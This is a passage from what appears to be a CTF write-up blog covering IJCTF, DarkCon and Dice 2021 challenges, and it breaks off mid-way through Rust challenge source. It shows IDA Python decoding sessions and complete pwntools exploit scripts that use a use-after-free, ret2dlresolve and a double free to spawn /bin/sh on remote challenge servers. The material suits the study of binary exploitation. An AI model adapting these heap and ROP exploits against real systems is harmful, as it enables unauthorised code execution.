class="line">b&#x27;b\x7f\xbe\xd2\xf0r\xcfS777\xf0r\xcb7777\xbcr\xcb\x0cr\xcf8\xba\t677\x7f\x8dwFk77777\xbcr\xcb\x7f\xaf8\x8135\xf7\xdf3\xbe\xf6\xbcr\xcb\xb4\xf76\x7f\x8dwFk77777\x7f\xaf8\x81358\x81\xf7\xf6\xd736\xff\xbfr\xc0\xbcr\xcb\xb4\xf76\x7f\x8dwFk77777\x7f\xaf8\x8135\xf7\xdf3\xbe\xf6\x7f\x8dwFk77777\xbcr\xcb\x7f\xaf8\x81358\x81\xf7\xf6\xd736\xff\xbfr\xc18\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc1\xb3\xf7N&lt;8\x81r\xc16\xf7\xb4\xff6\xdc18\x81r\xc16\xf7\xbfr\xc18\x81r\xc1\xb3\xf7N&lt;8\x81r\xc16\xf7\xb4\xff6\xdc18\x81r\xc16\xf7\xbfr\xc1\xb7B\xc0$\xb7B\xc1\x00\x7f\x8ewFk77777\xbcr\xcb\x7f\xaf8\x81b\xc0\xbf#6\xbcr\xcb\xb4\xf76\x7f\x8ewFk77777\x7f\xaf8\x81b\xc1\xbf#6\xb4r\xcb5\xde\x81\xc9\xc8\xc8\xa7j\xf4\x04&#x27;</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5c7766,c)</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Python&gt;c = bytes([ch^0x37 for ch in list(get_bytes(0x5c7766,0xf8))])</span><br><span class="line">Python&gt;c</span><br><span class="line">b&#x27;UH\x89\xe5H\xbe\xa8q\\\x00\x00\x00\x00\x00H\xbf \x9d\\\x00\x00\x00\x00\x00H\xb8\xd0\xfbF\x00\x00\x00\x00\x00\xff\xd0H\xbf\xa8q\\\x00\x00\x00\x00\x00H\xb8@\nM\x00\x00\x00\x00\x00\xff\xd0\x85\xc0\x0f\x94\xc0\x84\xc0\x0f\x84\xad\x00\x00\x00H\xbe\xb2q\\\x00\x00\x00\x00\x00H\xbf \x9d\\\x00\x00\x00\x00\x00H\xb8\x10\x03G\x00\x00\x00\x00\x00\xff\xd0H\xbf \x9d\\\x00\x00\x00\x00\x00H\xb8@\x05G\x00\x00\x00\x00\x00\xff\xd0H\xbe\xbfq\\\x00\x00\x00\x00\x00H\x89\xc7H\xb8\xd0\xf5M\x00\x00\x00\x00\x00\xff\xd0H\xba\x08\x9d\\\x00\x00\x00\x00\x00H\x89\x02H\xb8\x08\x9d\\\x00\x00\x00\x00\x00H\x8b\x00H\xba@q\\\x00\x00\x00\x00\x00H\xbe\xb8q\\\x00\x00\x00\x00\x00H\x89\xc7\xb8\x00\x00\x00\x00H\xb9\xf0\x07M\x00\x00\x00\x00\x00\xff\xd1H\xb8\x08\x9d\\\x00\x00\x00\x00\x00H\x8b\x00H\x89\xc7H\xb8\x80\xeeM\x00\x00\x00\x00\x00\xff\xd0\x90]\xc37&#x27;</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5c7766,c)</span><br></pre></td></tr></table></figure>



<h2 id="Family-rev"><a href="#Family-rev" class="headerlink" title="Family-rev"></a>Family-rev</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;p <span class="number">0x108</span>-<span class="number">0xe0</span></span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    p <span class="number">0x108</span>-<span class="number">0xe0</span></span><br><span class="line">          ^</span><br><span class="line">SyntaxError: invalid syntax</span><br><span class="line">Python&gt;<span class="number">0x108</span>-<span class="number">0xe0</span></span><br><span class="line"><span class="number">0x28</span></span><br><span class="line">Python&gt;get_bytes(here(),<span class="number">0x28</span>)</span><br><span class="line"><span class="string">b&#x27;e\xa7x\xe0\x0b\x854\x8dUJ\x08\xba\x95\xbfN\xe8\xb7\x98n\x12\xe1(\xa9p\xd3\xd1\x8b\x1e/\xf9\x97\x01\xe0\x15\x1eq\xe4wh\x11&#x27;</span></span><br><span class="line">Python&gt;<span class="built_in">list</span>(get_bytes(here(),<span class="number">0x28</span>))</span><br><span class="line">[<span class="number">0x3a</span>, <span class="number">0xf7</span>, <span class="number">0x0</span>, <span class="number">0x68</span>, <span class="number">0x6</span>, <span class="number">0x2e</span>, <span class="number">0x29</span>, <span class="number">0x89</span>, <span class="number">0xf4</span>, <span class="number">0x67</span>, <span class="number">0x2e</span>, <span class="number">0xc6</span>, <span class="number">0xd6</span>, <span class="number">0x6e</span>, <span class="number">0x12</span>, <span class="number">0x75</span>, <span class="number">0x1b</span>, <span class="number">0xba</span>, <span class="number">0x64</span>, <span class="number">0x44</span>, <span class="number">0x1b</span>, <span class="number">0x24</span>, <span class="number">0xa5</span>, <span class="number">0x30</span>, <span class="number">0x3a</span>, <span class="number">0xfe</span>, <span class="number">0xa7</span>, <span class="number">0xd</span>, <span class="number">0x74</span>, <span class="number">0xaf</span>, <span class="number">0x99</span>, <span class="number">0xce</span>, <span class="number">0x12</span>, <span class="number">0xe1</span>, <span class="number">0x1a</span>, <span class="number">0x92</span>, <span class="number">0x87</span>, <span class="number">0xf3</span>, <span class="number">0xdd</span>, <span class="number">0xdd</span>]</span><br><span class="line">Python&gt;get_bytes(here(),<span class="number">0x28</span>)</span><br><span class="line"><span class="string">b&#x27;:\xf7\x00h\x06.)\x89\xf4g.\xc6\xd6n\x12u\x1b\xbadD\x1b$\xa50:\xfe\xa7\rt\xaf\x99\xce\x12\xe1\x1a\x92\x87\xf3\xdd\xdd&#x27;</span></span><br><span class="line">Python&gt;get_bytes(here(),<span class="number">0x28</span>)</span><br><span class="line"><span class="string">b&#x27;\xbb\xf0\xd9\xf2(c\xa1\x93\x92\xc55\xeeG\x9a^\x86&amp;\xd7\xd5R\xb0d\x92\xe3\xe8L\x82\xa4\xb8\x9f\x9a\xc0\xa8\xce\x10z\xe3\xbf\xc7\xd5&#x27;</span></span><br><span class="line">Python&gt;get_bytes(here(),<span class="number">0x28</span>)</span><br><span class="line"><span class="string">b&#x27;\xc9\x06\xa4N]3\xcb\xe7\xca\xb3w\xe3d\x0c\x8b\xc8\xee\x14\xa2pB\x89\xbf\xe2&quot;\x1a\xb9\xf5\x9aq\xb2\xba&lt;&gt;m\xaf\xbd\n\x1d\x82&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>++v5;<br>regs.edx &#x3D; *(unsigned __int8 *)(v5 + 0x804A060);<br>lodsb al, byte [esi]<br>mov bl, al<br>regs.eax &#x3D; (unsigned __int8)(LOBYTE(regs.ebx) ^ LOBYTE(regs.edx));<br>mov bl, al<br>regs.edx &#x3D; *(unsigned __int8 *)(v5 + 0x804A020);<br>regs.eax &#x3D; LOBYTE(regs.ebx) + LOBYTE(regs.edx);<br>mov bl, al<br>regs.edx &#x3D; *(unsigned __int8 *)(v5 + 0x804A0A0);<br>regs.eax &#x3D; LOBYTE(regs.ebx) - LOBYTE(regs.edx);<br>mov bl, al<br>regs.edx &#x3D; *(unsigned __int8 *)(v5 + 0x804A0E0);<br>cmp bl, dl</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/08/16/2021ijctf/" data-id="cuidPZGMmQxV7o8DBWDqkWWoz" data-title="IJCTF 2021" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2021darkconctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/25/2021darkconctf/" class="article-date">
  <time class="dt-published" datetime="2021-02-25T03:07:10.000Z" itemprop="datePublished">2021-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/25/2021darkconctf/">DarkCon 2021 CTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="no-output"><a href="#no-output" class="headerlink" title="no-output"></a>no-output</h2><p>Vulnerabilities:</p>
<ul>
<li>uaf in edit(0x40140c)</li>
<li>buffer overflow in init(0x401236)</li>
</ul>
<p>Exploit:</p>
<ul>
<li>no read or write function</li>
<li>no leak</li>
<li>return to dl_resolve<ul>
<li>write fake reloc&#x2F;sym in .bss use uaf</li>
<li>write free@GOT to init and <code>__stack_chk_fail</code> to ret</li>
<li>stack overflow for return to <code>dl_runtime_reslove</code></li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = <span class="string">&#x27;nooutput&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST,PORT = <span class="string">&quot;13.233.166.242&quot;</span>, <span class="number">49153</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"><span class="comment"># p = process(&#x27;./nooutput&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./nooutput&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz,cnt</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">    p.send(cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,cnt</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.send(cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(e, symbol=<span class="string">&#x27;system&#x27;</span>, args=[<span class="string">&#x27;/bin/sh\x00&#x27;</span>])</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x58</span>, <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x58</span>, <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(dlresolve.data_addr).ljust(<span class="number">0x58</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x58</span>, <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x58</span>, dlresolve.payload.ljust(<span class="number">0x58</span>,<span class="string">&#x27;\0&#x27;</span>)) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x18</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x18</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x404018</span>).ljust(<span class="number">0x18</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x18</span>,<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line"><span class="comment"># free -&gt; 0x401236</span></span><br><span class="line"><span class="comment"># __stack_chk_fail -&gt; ret</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x18</span>,p64(<span class="number">0x401236</span>)+p64(<span class="number">0x4011B0</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># ret</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+rop.chain()+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/25/2021darkconctf/" data-id="cuidmWKGi4xT1VkdP4w4dWQjG" data-title="DarkCon 2021 CTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2021dicectf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/16/2021dicectf/" class="article-date">
  <time class="dt-published" datetime="2021-02-16T03:07:10.000Z" itemprop="datePublished">2021-02-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/16/2021dicectf/">Dice 2021 CTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Easy"><a href="#Easy" class="headerlink" title="Easy"></a>Easy</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> past.builtins <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST,PORT = <span class="string">&quot;dicec.tf&quot;</span>, <span class="number">31904</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./flippidy&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, cnt</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>, cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flip</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;be: &#x27;</span>, <span class="built_in">str</span>(<span class="number">13</span>))</span><br><span class="line">add(<span class="number">6</span>, p64(<span class="number">0x404020</span>)+p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">flip() <span class="comment"># double free</span></span><br><span class="line">add(<span class="number">6</span>, p64(<span class="number">0x403F88</span>)+p64(<span class="number">0x404072</span>)+p64(<span class="number">0x4040a4</span>)+p64(<span class="number">0x4040d6</span>)+p64(<span class="number">0x404040</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">free = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;@ free: &quot;</span>+<span class="built_in">hex</span>(free))</span><br><span class="line">l = free-<span class="number">0x97950</span></span><br><span class="line">log.info(<span class="string">&quot;@ l: &quot;</span>+<span class="built_in">hex</span>(l))</span><br><span class="line">add(<span class="number">6</span>, p64(l+<span class="number">0x3ed8e8</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, p64(l+<span class="number">0x04f440</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">flip()</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># dice&#123;some_dance_to_remember_some_dance_to_forget_2.27_checks_aff239e1a52cf55cd85c9c16&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Soucelessrustwasm"><a href="#Soucelessrustwasm" class="headerlink" title="Soucelessrustwasm"></a>Soucelessrustwasm</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"><span class="keyword">use</span> std::process;</span><br><span class="line"><span class="keyword">use</span> std::io::Write;</span><br><span class="line"><span class="keyword">use</span> std::io::Read;</span><br><span class="line"><span class="keyword">use</span> std::fs;</span><br><span class="line"><span class="keyword">use</span> std::ptr;</span><br><span class="line"><span class="keyword">use</span> std::<span class="type">str</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> <span class="title class_">Sword</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">inspect</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span>;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">display</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">RustySword</span> &#123;</span><br><span class="line">    name: <span class="type">String</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Sword</span> <span class="keyword">for</span> <span class="title class_">RustySword</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">inspect</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">read_file</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">display</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> () &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Name: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.name);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Description: &#123;&#125;&quot;</span>, <span class="title function_ invoke__">read_file</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NewSword</span> &#123;</span><br><span class="line">    name: <span class="type">String</span>,</span><br><span class="line">    desc: <span class="type">String</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Sword</span> <span class="keyword">for</span> <span class="title class_">NewSword</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">inspect</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;You inspect your handiwork.&quot;</span>);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;You admire its blade, and note something interesting.&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">desc</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">            .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> desc)</span><br><span class="line">            .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;failed to read input.&quot;</span>);</span><br><span class="line">        <span class="keyword">self</span>.desc = desc;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.desc.<span class="title function_ invoke__">clone</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">display</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> () &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Name: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.name);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Description: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">menu</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;1. Forge a weapon&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;2. Scrap a weapon&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;3. Inspect a weapon&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;4. View stock&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;5. View log&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;6. Exit&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">forge</span>&lt;<span 